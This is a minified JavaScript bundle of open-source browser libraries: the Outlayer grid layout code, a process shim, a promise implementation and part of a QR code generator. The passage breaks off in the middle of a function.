define&&define.amd?define(["ev-emitter/ev-emitter","get-size/get-size"],i):"object"==_typeof2(t)&&t.exports?t.exports=i(e("ev-emitter"),e("get-size")):(r.Outlayer={},r.Outlayer.Item=i(r.EvEmitter,r.getSize))},{"ev-emitter":39,"get-size":41}],228:[function(e,t,n){var r,i;r=window,i=function(e,t,n,r,i){var a=e.console,o=e.jQuery,s=function(){},l=0,c={};function u(e,t){var n=r.getQueryElement(e);if(n){this.element=n,o&&(this.$element=o(this.element)),this.options=r.extend({},this.constructor.defaults),this.option(t);var i=++l;this.element.outlayerGUID=i,(c[i]=this)._create(),this._getOption("initLayout")&&this.layout()}else a&&a.error("Bad element for "+this.constructor.namespace+": "+(n||e))}u.namespace="outlayer",u.Item=i,u.defaults={containerStyle:{position:"relative"},initLayout:!0,originLeft:!0,originTop:!0,resize:!0,resizeContainer:!0,transitionDuration:"0.4s",hiddenStyle:{opacity:0,transform:"scale(0.001)"},visibleStyle:{opacity:1,transform:"scale(1)"}};var d=u.prototype;function p(e){function t(){e.apply(this,arguments)}return(t.prototype=Object.create(e.prototype)).constructor=t}r.extend(d,t.prototype),d.option=function(e){r.extend(this.options,e)},d._getOption=function(e){var t=this.constructor.compatOptions[e];return t&&void 0!==this.options[t]?this.options[t]:this.options[e]},u.compatOptions={initLayout:"isInitLayout",horizontal:"isHorizontal",layoutInstant:"isLayoutInstant",originLeft:"isOriginLeft",originTop:"isOriginTop",resize:"isResizeBound",resizeContainer:"isResizingContainer"},d._create=function(){this.reloadItems(),this.stamps=[],this.stamp(this.options.stamp),r.extend(this.element.style,this.options.containerStyle),this._getOption("resize")&&this.bindResize()},d.reloadItems=function(){this.items=this._itemize(this.element.children)},d._itemize=function(e){for(var t=this._filterFindItemElements(e),n=this.constructor.Item,r=[],i=0;i<t.length;i++){var a=new n(t[i],this);r.push(a)}return r},d._filterFindItemElements=function(e){return r.filterFindElements(e,this.options.itemSelector)},d.getItemElements=function(){return this.items.map((function(e){return e.element}))},d.layout=function(){this._resetLayout(),this._manageStamps();var e=this._getOption("layoutInstant"),t=void 0!==e?e:!this._isLayoutInited;this.layoutItems(this.items,t),this._isLayoutInited=!0},d._init=d.layout,d._resetLayout=function(){this.getSize()},d.getSize=function(){this.size=n(this.element)},d._getMeasurement=function(e,t){var r,i=this.options[e];this[e]=i?("string"==typeof i?r=this.element.querySelector(i):i instanceof HTMLElement&&(r=i),r?n(r)[t]:i):0},d.layoutItems=function(e,t){e=this._getItemsForLayout(e),this._layoutItems(e,t),this._postLayout()},d._getItemsForLayout=function(e){return e.filter((function(e){return!e.isIgnored}))},d._layoutItems=function(e,t){if(this._emitCompleteOnItems("layout",e),e&&e.length){var n=[];e.forEach((function(e){var r=this._getItemLayoutPosition(e);r.item=e,r.isInstant=t||e.isLayoutInstant,n.push(r)}),this),this._processLayoutQueue(n)}},d._getItemLayoutPosition=function(){return{x:0,y:0}},d._processLayoutQueue=function(e){this.updateStagger(),e.forEach((function(e,t){this._positionItem(e.item,e.x,e.y,e.isInstant,t)}),this)},d.updateStagger=function(){var e=this.options.stagger;if(null!=e)return this.stagger=function(e){if("number"==typeof e)return e;var t=e.match(/(^\d*\.?\d*)(\w*)/),n=t&&t[1],r=t&&t[2];return n.length?(n=parseFloat(n))*(h[r]||1):0}(e),this.stagger;this.stagger=0},d._positionItem=function(e,t,n,r,i){r?e.goTo(t,n):(e.stagger(i*this.stagger),e.moveTo(t,n))},d._postLayout=function(){this.resizeContainer()},d.resizeContainer=function(){if(this._getOption("resizeContainer")){var e=this._getContainerSize();e&&(this._setContainerMeasure(e.width,!0),this._setContainerMeasure(e.height,!1))}},d._getContainerSize=s,d._setContainerMeasure=function(e,t){if(void 0!==e){var n=this.size;n.isBorderBox&&(e+=t?n.paddingLeft+n.paddingRight+n.borderLeftWidth+n.borderRightWidth:n.paddingBottom+n.paddingTop+n.borderTopWidth+n.borderBottomWidth),e=Math.max(e,0),this.element.style[t?"width":"height"]=e+"px"}},d._emitCompleteOnItems=function(e,t){var n=this;function r(){n.dispatchEvent(e+"Complete",null,[t])}var i=t.length;if(t&&i){var a=0;t.forEach((function(t){t.once(e,o)}))}else r();function o(){++a==i&&r()}},d.dispatchEvent=function(e,t,n){var r=t?[t].concat(n):n;if(this.emitEvent(e,r),o)if(this.$element=this.$element||o(this.element),t){var i=o.Event(t);i.type=e,this.$element.trigger(i,n)}else this.$element.trigger(e,n)},d.ignore=function(e){var t=this.getItem(e);t&&(t.isIgnored=!0)},d.unignore=function(e){var t=this.getItem(e);t&&delete t.isIgnored},d.stamp=function(e){(e=this._find(e))&&(this.stamps=this.stamps.concat(e),e.forEach(this.ignore,this))},d.unstamp=function(e){(e=this._find(e))&&e.forEach((function(e){r.removeFrom(this.stamps,e),this.unignore(e)}),this)},d._find=function(e){if(e)return"string"==typeof e&&(e=this.element.querySelectorAll(e)),r.makeArray(e)},d._manageStamps=function(){this.stamps&&this.stamps.length&&(this._getBoundingRect(),this.stamps.forEach(this._manageStamp,this))},d._getBoundingRect=function(){var e=this.element.getBoundingClientRect(),t=this.size;this._boundingRect={left:e.left+t.paddingLeft+t.borderLeftWidth,top:e.top+t.paddingTop+t.borderTopWidth,right:e.right-(t.paddingRight+t.borderRightWidth),bottom:e.bottom-(t.paddingBottom+t.borderBottomWidth)}},d._manageStamp=s,d._getElementOffset=function(e){var t=e.getBoundingClientRect(),r=this._boundingRect,i=n(e);return{left:t.left-r.left-i.marginLeft,top:t.top-r.top-i.marginTop,right:r.right-t.right-i.marginRight,bottom:r.bottom-t.bottom-i.marginBottom}},d.handleEvent=r.handleEvent,d.bindResize=function(){e.addEventListener("resize",this),this.isResizeBound=!0},d.unbindResize=function(){e.removeEventListener("resize",this),this.isResizeBound=!1},d.onresize=function(){this.resize()},r.debounceMethod(u,"onresize",100),d.resize=function(){this.isResizeBound&&this.needsResizeLayout()&&this.layout()},d.needsResizeLayout=function(){var e=n(this.element);return this.size&&e&&e.innerWidth!==this.size.innerWidth},d.addItems=function(e){var t=this._itemize(e);return t.length&&(this.items=this.items.concat(t)),t},d.appended=function(e){var t=this.addItems(e);t.length&&(this.layoutItems(t,!0),this.reveal(t))},d.prepended=function(e){var t=this._itemize(e);if(t.length){var n=this.items.slice(0);this.items=t.concat(n),this._resetLayout(),this._manageStamps(),this.layoutItems(t,!0),this.reveal(t),this.layoutItems(n)}},d.reveal=function(e){if(this._emitCompleteOnItems("reveal",e),e&&e.length){var t=this.updateStagger();e.forEach((function(e,n){e.stagger(n*t),e.reveal()}))}},d.hide=function(e){if(this._emitCompleteOnItems("hide",e),e&&e.length){var t=this.updateStagger();e.forEach((function(e,n){e.stagger(n*t),e.hide()}))}},d.revealItemElements=function(e){var t=this.getItems(e);this.reveal(t)},d.hideItemElements=function(e){var t=this.getItems(e);this.hide(t)},d.getItem=function(e){for(var t=0;t<this.items.length;t++){var n=this.items[t];if(n.element==e)return n}},d.getItems=function(e){e=r.makeArray(e);var t=[];return e.forEach((function(e){var n=this.getItem(e);n&&t.push(n)}),this),t},d.remove=function(e){var t=this.getItems(e);this._emitCompleteOnItems("remove",t),t&&t.length&&t.forEach((function(e){e.remove(),r.removeFrom(this.items,e)}),this)},d.destroy=function(){var e=this.element.style;e.height="",e.position="",e.width="",this.items.forEach((function(e){e.destroy()})),this.unbindResize();var t=this.element.outlayerGUID;delete c[t],delete this.element.outlayerGUID,o&&o.removeData(this.element,this.constructor.namespace)},u.data=function(e){var t=(e=r.getQueryElement(e))&&e.outlayerGUID;return t&&c[t]},u.create=function(e,t){var n=p(u);return n.defaults=r.extend({},u.defaults),r.extend(n.defaults,t),n.compatOptions=r.extend({},u.compatOptions),n.namespace=e,n.data=u.data,n.Item=p(i),r.htmlInit(n,e),o&&o.bridget&&o.bridget(e,n),n};var h={ms:1,s:1e3};return u.Item=i,u},"function"==typeof define&&define.amd?define(["ev-emitter/ev-emitter","get-size/get-size","fizzy-ui-utils/utils","./item"],(function(e,t,n,a){return i(r,e,t,n,a)})):"object"==_typeof2(t)&&t.exports?t.exports=i(r,e("ev-emitter"),e("get-size"),e("fizzy-ui-utils"),e("./item")):r.Outlayer=i(r,r.EvEmitter,r.getSize,r.fizzyUIUtils,r.Outlayer.Item)},{"./item":227,"ev-emitter":39,"fizzy-ui-utils":40,"get-size":41}],229:[function(e,t,n){var r,i,a=t.exports={};function o(){throw new Error("setTimeout has not been defined")}function s(){throw new Error("clearTimeout has not been defined")}function l(e){if(r===setTimeout)return setTimeout(e,0);if((r===o||!r)&&setTimeout)return r=setTimeout,setTimeout(e,0);try{return r(e,0)}catch(t){try{return r.call(null,e,0)}catch(t){return r.call(this,e,0)}}}!function(){try{r="function"==typeof setTimeout?setTimeout:o}catch(e){r=o}try{i="function"==typeof clearTimeout?clearTimeout:s}catch(e){i=s}}();var c,u=[],d=!1,p=-1;function h(){d&&c&&(d=!1,c.length?u=c.concat(u):p=-1,u.length&&f())}function f(){if(!d){var e=l(h);d=!0;for(var t=u.length;t;){for(c=u,u=[];++p<t;)c&&c[p].run();p=-1,t=u.length}c=null,d=!1,function(e){if(i===clearTimeout)return clearTimeout(e);if((i===s||!i)&&clearTimeout)return i=clearTimeout,clearTimeout(e);try{i(e)}catch(t){try{return i.call(null,e)}catch(t){return i.call(this,e)}}}(e)}}function A(e,t){this.fun=e,this.array=t}function m(){}a.nextTick=function(e){var t=new Array(arguments.length-1);if(1<arguments.length)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];u.push(new A(e,t)),1!==u.length||d||l(f)},A.prototype.run=function(){this.fun.apply(null,this.array)},a.title="browser",a.browser=!0,a.env={},a.argv=[],a.version="",a.versions={},a.on=m,a.addListener=m,a.once=m,a.off=m,a.removeListener=m,a.removeAllListeners=m,a.emit=m,a.prependListener=m,a.prependOnceListener=m,a.listeners=function(e){return[]},a.binding=function(e){throw new Error("process.binding is not supported")},a.cwd=function(){return"/"},a.chdir=function(e){throw new Error("process.chdir is not supported")},a.umask=function(){return 0}},{}],230:[function(e,t,n){t.exports=e("./lib")},{"./lib":235}],231:[function(e,t,n){var r=e("asap/raw");function i(){}var a=null,o={};function s(e){if("object"!==_typeof2(this))throw new TypeError("Promises must be constructed via new");if("function"!=typeof e)throw new TypeError("Promise constructor's argument is not a function");this._U=0,this._V=0,this._W=null,this._X=null,e!==i&&h(e,this)}function l(e,t){for(;3===e._V;)e=e._W;if(s._Y&&s._Y(e),0===e._V)return 0===e._U?(e._U=1,void(e._X=t)):1===e._U?(e._U=2,void(e._X=[e._X,t])):void e._X.push(t);var n,i;n=e,i=t,r((function(){var e=1===n._V?i.onFulfilled:i.onRejected;if(null!==e){var t=function(e,t){try{return e(t)}catch(e){return a=e,o}}(e,n._W);t===o?u(i.promise,a):c(i.promise,t)}else 1===n._V?c(i.promise,n._W):u(i.promise,n._W)}))}function c(e,t){if(t===e)return u(e,new TypeError("A promise cannot be resolved with itself."));if(t&&("object"===_typeof2(t)||"function"==typeof t)){var n=function(e){try{return e.then}catch(e){return a=e,o}}(t);if(n===o)return u(e,a);if(n===e.then&&t instanceof s)return e._V=3,e._W=t,void d(e);if("function"==typeof n)return void h(n.bind(t),e)}e._V=1,e._W=t,d(e)}function u(e,t){e._V=2,e._W=t,s._Z&&s._Z(e,t),d(e)}function d(e){if(1===e._U&&(l(e,e._X),e._X=null),2===e._U){for(var t=0;t<e._X.length;t++)l(e,e._X[t]);e._X=null}}function p(e,t,n){this.onFulfilled="function"==typeof e?e:null,this.onRejected="function"==typeof t?t:null,this.promise=n}function h(e,t){var n=!1,r=function(e,t,n){try{e(t,n)}catch(e){return a=e,o}}(e,(function(e){n||(n=!0,c(t,e))}),(function(e){n||(n=!0,u(t,e))}));n||r!==o||(n=!0,u(t,a))}(t.exports=s)._Y=null,s._Z=null,s._0=i,s.prototype.then=function(e,t){if(this.constructor!==s)return r=e,a=t,new(n=this).constructor((function(e,t){var o=new s(i);o.then(e,t),l(n,new p(r,a,o))}));var n,r,a,o=new s(i);return l(this,new p(e,t,o)),o}},{"asap/raw":6}],232:[function(e,t,n){var r=e("./core.js");(t.exports=r).prototype.done=function(e,t){(arguments.length?this.then.apply(this,arguments):this).then(null,(function(e){setTimeout((function(){throw e}),0)}))}},{"./core.js":231}],233:[function(e,t,n){var r=e("./core.js");t.exports=r;var i=u(!0),a=u(!1),o=u(null),s=u(void 0),l=u(0),c=u("");function u(e){var t=new r(r._0);return t._V=1,t._W=e,t}r.resolve=function(e){if(e instanceof r)return e;if(null===e)return o;if(void 0===e)return s;if(!0===e)return i;if(!1===e)return a;if(0===e)return l;if(""===e)return c;if("object"===_typeof2(e)||"function"==typeof e)try{var t=e.then;if("function"==typeof t)return new r(t.bind(e))}catch(e){return new r((function(t,n){n(e)}))}return u(e)};var d=function(e){return"function"==typeof Array.from?(d=Array.from,Array.from(e)):(d=function(e){return Array.prototype.slice.call(e)},Array.prototype.slice.call(e))};r.all=function(e){var t=d(e);return new r((function(e,n){if(0===t.length)return e([]);var i=t.length;function a(o,s){if(s&&("object"===_typeof2(s)||"function"==typeof s)){if(s instanceof r&&s.then===r.prototype.then){for(;3===s._V;)s=s._W;return 1===s._V?a(o,s._W):(2===s._V&&n(s._W),void s.then((function(e){a(o,e)}),n))}var l=s.then;if("function"==typeof l)return void new r(l.bind(s)).then((function(e){a(o,e)}),n)}t[o]=s,0==--i&&e(t)}for(var o=0;o<t.length;o++)a(o,t[o])}))},r.reject=function(e){return new r((function(t,n){n(e)}))},r.race=function(e){return new r((function(t,n){d(e).forEach((function(e){r.resolve(e).then(t,n)}))}))},r.prototype.catch=function(e){return this.then(null,e)}},{"./core.js":231}],234:[function(e,t,n){var r=e("./core.js");(t.exports=r).prototype.finally=function(e){return this.then((function(t){return r.resolve(e()).then((function(){return t}))}),(function(t){return r.resolve(e()).then((function(){throw t}))}))}},{"./core.js":231}],235:[function(e,t,n){t.exports=e("./core.js"),e("./done.js"),e("./finally.js"),e("./es6-extensions.js"),e("./node-extensions.js"),e("./synchronous.js")},{"./core.js":231,"./done.js":232,"./es6-extensions.js":233,"./finally.js":234,"./node-extensions.js":236,"./synchronous.js":237}],236:[function(e,t,n){var r=e("./core.js"),i=e("asap");(t.exports=r).denodeify=function(e,t){return"number"==typeof t&&t!==1/0?function(e,t){for(var n=[],i=0;i<t;i++)n.push("a"+i);var o=["return function ("+n.join(",")+") {","var self = this;","return new Promise(function (rs, rj) {","var res = fn.call(",["self"].concat(n).concat([a]).join(","),");","if (res &&",'(typeof res === "object" || typeof res === "function") &&','typeof res.then === "function"',") {rs(res);}","});","};"].join("");return Function(["Promise","fn"],o)(r,e)}(e,t):function(e){for(var t=Math.max(e.length-1,3),n=[],i=0;i<t;i++)n.push("a"+i);var o=["return function ("+n.join(",")+") {","var self = this;","var args;","var argLength = arguments.length;","if (arguments.length > "+t+") {","args = new Array(arguments.length + 1);","for (var i = 0; i < arguments.length; i++) {","args[i] = arguments[i];","}","}","return new Promise(function (rs, rj) {","var cb = "+a+";","var res;","switch (argLength) {",n.concat(["extra"]).map((function(e,t){return"case "+t+":res = fn.call("+["self"].concat(n.slice(0,t)).concat("cb").join(",")+");break;"})).join(""),"default:","args[argLength] = cb;","res = fn.apply(self, args);","}","if (res &&",'(typeof res === "object" || typeof res === "function") &&','typeof res.then === "function"',") {rs(res);}","});","};"].join("");return Function(["Promise","fn"],o)(r,e)}(e)};var a="function (err, res) {if (err) { rj(err); } else { rs(res); }}";r.nodeify=function(e){return function(){var t=Array.prototype.slice.call(arguments),n="function"==typeof t[t.length-1]?t.pop():null,a=this;try{return e.apply(this,arguments).nodeify(n,a)}catch(e){if(null==n)return new r((function(t,n){n(e)}));i((function(){n.call(a,e)}))}}},r.prototype.nodeify=function(e,t){if("function"!=typeof e)return this;this.then((function(n){i((function(){e.call(t,null,n)}))}),(function(n){i((function(){e.call(t,n)}))}))}},{"./core.js":231,asap:5}],237:[function(e,t,n){var r=e("./core.js");(t.exports=r).enableSynchronous=function(){r.prototype.isPending=function(){return 0==this.getState()},r.prototype.isFulfilled=function(){return 1==this.getState()},r.prototype.isRejected=function(){return 2==this.getState()},r.prototype.getValue=function(){if(3===this._V)return this._W.getValue();if(!this.isFulfilled())throw new Error("Cannot get a value of an unfulfilled promise.");return this._W},r.prototype.getReason=function(){if(3===this._V)return this._W.getReason();if(!this.isRejected())throw new Error("Cannot get a rejection reason of a non-rejected promise.");return this._W},r.prototype.getState=function(){return 3===this._V?this._W.getState():-1===this._V||-2===this._V?0:this._V}},r.disableSynchronous=function(){r.prototype.isPending=void 0,r.prototype.isFulfilled=void 0,r.prototype.isRejected=void 0,r.prototype.getValue=void 0,r.prototype.getReason=void 0,r.prototype.getState=void 0}},{"./core.js":231}],238:[function(e,t,n){var r=e("./can-promise"),i=e("./core/qrcode"),a=e("./renderer/canvas"),o=e("./renderer/svg-tag.js");function s(e,t,n,a,o){var s=[].slice.call(arguments,1),l=s.length,c="function"==typeof s[l-1];if(!c&&!r())throw new Error("Callback required as last argument");if(!c){if(l<1)throw new Error("Too few arguments provided");return 1===l?(n=t,t=a=void 0):2!==l||t.getContext||(a=n,n=t,t=void 0),new Promise((function(r,o){try{var s=i.create(n,a);r(e(s,t,a))}catch(r){o(r)}}))}if(l<2)throw new Error("Too few arguments provided");2===l?(o=n,n=t,t=a=void 0):3===l&&(t.getContext&&void 0===o?(o=a,a=void 0):(o=a,a=n,n=t,t=void 0));try{var u=i.create(n,a);o(null,e(u,t,a))}catch(s){o(s)}}n.create=i.create,n.toCanvas=s.bind(null,a.render),n.toDataURL=s.bind(null,a.renderToDataURL),n.toString=s.bind(null,(function(e,t,n){return o.render(e,n)}))},{"./can-promise":239,"./core/qrcode":255,"./renderer/canvas":262,"./renderer/svg-tag.js":263}],239:[function(e,t,n){t.exports=function(){return"function"==typeof Promise&&Promise.prototype&&Promise.prototype.then}},{}],240:[function(e,t,n){var r=e("./utils").getSymbolSize;n.getRowColCoords=function(e){if(1===e)return[];for(var t=Math.floor(e/7)+2,n=r(e),i=145===n?26:2*Math.ceil((n-13)/(2*t-2)),a=[n-7],o=1;o<t-1;o++)a[o]=a[o-1]-i;return a.push(6),a.reverse()},n.getPositions=function(e){for(var t=[],r=n.getRowColCoords(e),i=r.length,a=0;a<i;a++)for(var o=0;o<i;o++)0===a&&0===o||0===a&&o===i-1||a===i-1&&0===o||t.push([r[a],r[o]]);return t}},{"./utils":259}],241:[function(e,t,n){var r=e("./mode"),i=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function a(e){this.mode=r.ALPHANUMERIC,this.data=e}a.getBitsLength=function(e){return 11*Math.floor(e/2)+e%2*6},a.prototype.getLength=function(){return this.data.length},a.prototype.getBitsLength=function(){return a.getBitsLength(this.data.length)},a.prototype.write=function(e){var t;for(t=0;t+2<=this.data.length;t+=2){var n=45*i.indexOf(this.data[t]);n+=i.indexOf(this.data[t+1]),e.put(n,11)}this.data.length%2&&e.put(i.indexOf(this.data[t]),6)},t.exports=a},{"./mode":252}],242:[function(e,t,n){function r(){this.buffer=[],this.length=0}r.prototype={get:function(e){var t=Math.floor(e/8);return 1==(this.buffer[t]>>>7-e%8&1)},put:function(e,t){for(var n=0;n<t;n++)this.putBit(1==(e>>>t-n-1&1))},getLengthInBits:function(){return this.length},putBit:function(e){var t=Math.floor(this.length/8);this.buffer.length<=t&&this.buffer.push(0),e&&(this.buffer[t]|=128>>>this.length%8),this.length++}},t.exports=r},{}],243:[function(e,t,n){function r(e){if(!e||e<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=e,this.data=new Uint8Array(e*e),this.reservedBit=new Uint8Array(e*e)}r.prototype.set=function(e,t,n,r){var i=e*this.size+t;this.data[i]=n,r&&(this.reservedBit[i]=!0)},r.prototype.get=function(e,t){return this.data[e*this.size+t]},r.prototype.xor=function(e,t,n){this.data[e*this.size+t]^=n},r.prototype.isReserved=function(e,t){return this.reservedBit[e*this.size+t]},t.exports=r},{}],244:[function(e,t,n){var r=e("encode-utf8"),i=e("./mode");function a(e){this.mode=i.BYTE,this.data=new Uint8Array(r(e))}a.getBitsLength=function(e){return 8*e},a.prototype.getLength=function(){return this.data.length},a.prototype.getBitsLength=function(){return a.getBitsLength(this.data.length)},a.prototype.write=function(e){for(var t=0,n=this.data.length;t<n;t++)e.put(this.data[t],8)},t.exports=a},{"./mode":252,"encode-utf8":38}],245:[function(e,t,n){var r=e("./error-correction-level"),i=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],a=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];n.getBlocksCount=function(e,t){switch(t){case r.L:return i[4*(e-1)+0];case r.M:return i[4*(e-1)+1];case r.Q:return i[4*(e-1)+2];case r.H:return i[4*(e-1)+3];default:return}},n.getTotalCodewordsCount=function(e,t){switch(t){case r.L:return a[4*(e-1)+0];case r.M:return a[4*(e-1)+1];case r.Q:return a[4*(e-1)+2];case r.H:return a[4*(e-1)+3];default:return}}},{"./error-correction-level":246}],246:[function(e,t,n){n.L={bit:1},n.M={bit:0},n.Q={bit:3},n.H={bit:2},n.isValid=function(e){return e&&void 0!==e.bit&&0<=e.bit&&e.bit<4},n.from=function(e,t){if(n.isValid(e))return e;try{return function(e){if("string"!=typeof e)throw new Error("Param is not a string");switch(e.toLowerCase()){case"l":case"low":return n.L;case"m":case"medium":return n.M;case"q":case"quartile":return n.Q;case"h":case"high":return n.H;default:throw new Error("Unknown EC Level: "+e)}}(e)}catch(e){return t}}},{}],247:[function(e,t,n){var r=e("./utils").getSymbolSize;n.getPositions=function(e){var t=r(e);return[[0,0],[t-7,0],[0,t-7]]}},{"./utils":259}],248:[function(e,t,n){var r=e("./utils"),i=r.getBCHDigit(1335);n.getEncodedBits=function(e,t){for(var n=e.bit<<3|t,a=n<<10;0<=r.getBCHDigit(a)-i;)a^=1335<<r.getBCHDigit(a)-i;return 21522^(n<<10|a)}},{"./utils":259}],249:[function(e,t,n){var r=new Uint8Array(512),i=new Uint8Array(256);!function(){for(var e=1,t=0;t<255;t++)r[t]=e,i[e]=t,256&(e<<=1)&&(e^=285);for(var n=255;n<512;n++)r[n]=r[n-255]}(),n.log=function(e){if(e<1)throw new Error("log("+e+")");return i[e]},n.exp=function(e){return r[e]},n.mul=function(e,t){return 0===e||0===t?0:r[i[e]+i[t]]}},{}],250:[function(e,t,n){var r=e("./mode"),i=e("./utils");function a(e){this.mode=r.KANJI,this.data=e}a.getBitsLength=function(e){return 13*e},a.prototype.getLength=function(){return this.data.length},a.prototype.getBitsLength=function(){return a.getBitsLength(this.data.length)},a.prototype.write=function(e){var t;for(t=0;t<this.data.length;t++){var n=i.toSJIS(this.data[t]);if(33088<=n&&n<=40956)n-=33088;else{if(!(57408<=n&&n<=60351))throw new Error("Invalid SJIS character: "+this.data[t]+"\nMake sure your charset is UTF-8");n-=49472}n=192*(n>>>8&255)+(255&n),e.put(n,13)}},t.exports=a},{"./mode":252,"./utils":259}],251:[function(e,t,n){n.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};function r(e,t,r){switch(e){case n.Patterns.PATTERN000:return(t+r)%2==0;case n.Patterns.PATTERN001:return t%2==0;case n.Patterns.PATTERN010:return r%3==0;case n.Patterns.PATTERN011:return(t+r)%3==0;case n.Patterns.PATTERN100:return(Math.floor(t/2)+Math.floor(r/3))%2==0;case n.Patterns.PATTERN101:return t*r%2+t*r%3==0;case n.Patterns.PATTERN110:return(t*r%2+t*r%3)%2==0;case n.Patterns.PATTERN111:return(t*r%3+(t+r)%2)%2==0;default:throw new Error("bad maskPattern:"+e)}}n.isValid=function(e){return null!=e&&""!==e&&!isNaN(e)&&0<=e&&e<=7},n.from=function(e){return n.isValid(e)?parseInt(e,10):void 0},n.getPenaltyN1=function(e){for(var t=e.size,n=0,r=0,i=0,a=null,o=null,s=0;s<t;s++){r=i=0,a=o=null;for(var l=0;l<t;l++){var c=e.get(s,l);c===a?r++:(5<=r&&(n+=r-5+3),a=c,r=1),(c=e.get(l,s))===o?i++:(5<=i&&(n+=i-5+3),o=c,i=1)}5<=r&&(n+=r-5+3),5<=i&&(n+=i-5+3)}return n},n.getPenaltyN2=function(e){for(var t=e.size,n=0,r=0;r<t-1;r++)for(var i=0;i<t-1;i++){var a=e.get(r,i)+e.get(r,i+1)+e.get(r+1,i)+e.get(r+1,i+1);4!==a&&0!==a||n++}return 3*n},n.getPenaltyN3=function(e){for(var t=e.size,n=0,r=0,i=0,a=0;a<t;a++){r=i=0;for(var o=0;o<t;o++)r=r<<1&2047|e.get(a,o),10<=o&&(1488===r||93===r)&&n++,i=i<<1&2047|e.get(o,a),10<=o&&(1488===i||93===i)&&n++}return 40*n},n.getPenaltyN4=function(e){for(var t=0,n=e.data.length,r=0;r<n;r++)t+=e.data[r];return 10*Math.abs(Math.ceil(100*t/n/5)-10)},n.applyMask=function(e,t){for(var n=t.size,i=0;i<n;i++)for(var a=0;a<n;a++)t.isReserved(a,i)||t.xor(a,i,r(e,a,i))},n.getBestMask=function(e,t){for(var r=Object.keys(n.Patterns).length,i=0,a=1/0,o=0;o<r;o++){t(o),n.applyMask(o,e);var s=n.getPenaltyN1(e)+n.getPenaltyN2(e)+n.getPenaltyN3(e)+n.getPenaltyN4(e);n.applyMask(o,e),s<a&&(a=s,i=o)}return i}},{}],252:[function(e,t,n){var r=e("./version-check"),i=e("./regex");n.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},n.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},n.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},n.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},n.MIXED={bit:-1},n.getCharCountIndicator=function(e,t){if(!e.ccBits)throw new Error("Invalid mode: "+e);if(!r.isValid(t))throw new Error("Invalid version: "+t);return 1<=t&&t<10?e.ccBits[0]:t<27?e.ccBits[1]:e.ccBits[2]},n.getBestModeForData=function(e){return i.testNumeric(e)?n.NUMERIC:i.testAlphanumeric(e)?n.ALPHANUMERIC:i.testKanji(e)?n.KANJI:n.BYTE},n.toString=function(e){if(e&&e.id)return e.id;throw new Error("Invalid mode")},n.isValid=function(e){return e&&e.bit&&e.ccBits},n.from=function(e,t){if(n.isValid(e))return e;try{return function(e){if("string"!=typeof e)throw new Error("Param is not a string");switch(e.toLowerCase()){case"numeric":return n.NUMERIC;case"alphanumeric":return n.ALPHANUMERIC;case"kanji":return n.KANJI;case"byte":return n.BYTE;default:throw new Error("Unknown mode: "+e)}}(e)}catch(e){return t}}},{"./regex":257,"./version-check":260}],253:[function(e,t,n){var r=e("./mode");function i(e){this.mode=r.NUMERIC,this.data=e.toString()}i.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)},i.prototype.getLength=function(){return this.data.length},i.prototype.getBitsLength=function(){return i.getBitsLength(this.data.length)},i.prototype.write=function(e){var t,n,r;for(t=0;t+3<=this.data.length;t+=3)n=this.data.substr(t,3),r=parseInt(n,10),e.put(r,10);var i=this.data.length-t;0<i&&(n=this.data.substr(t),r=parseInt(n,10),e.put(r,3*i+1))},t.exports=i},{"./mode":252}],254:[function(e,t,n){var r=e("./galois-field");n.mul=function(e,t){for(var n=new Uint8Array(e.length+t.length-1),i=0;i<e.length;i++)for(var a=0;a<t.length;a++)n[i+a]^=r.mul(e[i],t[a]);return n},n.mod=function(e,t){for(var n=new Uint8Array(e);0<=n.length-t.length;){for(var i=n[0],a=0;a<t.length;a++)n[a]^=r.mul(t[a],i);for(var o=0;o<n.length&&0===n[o];)o++;n=n.slice(o)}return n},n.generateECPolynomial=function(e){for(var t=new Uint8Array([1]),i=0;i<e;i++)t=n.mul(t,new Uint8Array([1,r.exp(i)]));return t}},{"./galois-field":249}],255:[function(e,t,n){var r=e("./utils"),i=e("./error-correction-level"),a=e("./bit-buffer"),o=e("./bit-matrix"),s=e("./alignment-pattern"),l=e("./finder-pattern"),c=e("./mask-pattern"),u=e("./error-correction-code"),d=e("./reed-solomon-encoder"),p=e("./version"),h=e("./format-info"),f=e("./mode"),A=e("./segments");function m(e,t,n){var 